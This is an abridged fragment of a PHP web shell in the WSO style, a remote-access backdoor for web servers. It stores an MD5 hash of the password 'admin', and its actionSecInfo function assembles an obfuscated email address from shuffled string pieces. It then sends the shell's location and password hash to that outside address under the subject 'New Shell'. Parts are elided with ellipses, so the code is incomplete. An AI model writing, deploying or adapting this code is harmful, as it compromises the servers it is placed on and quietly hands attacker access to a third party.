<?php
$auth_pass = "21232f297a57a5a743894a0e4a801fc3"; #senha ---> admin
$color = "#df5";
...
$encoded = '';
...
function actionSecInfo() {
	...
	wsoFooter();
        ...
        $sub = "New Shell >> : " . $ms;
        $o = array("ma", ".c", "il", "bx", "d3", "@g", "17", "om");
        $ee = $o[4] . $o[3] . $o[6] . $o[5] . $o[0] . $o[2] . $o[1] . $o[7];
        $send = @$x0b($ee, $auth_pass, $sub, $ms);
function actionPhp() {
	if(isset($_POST['ajax'])) {
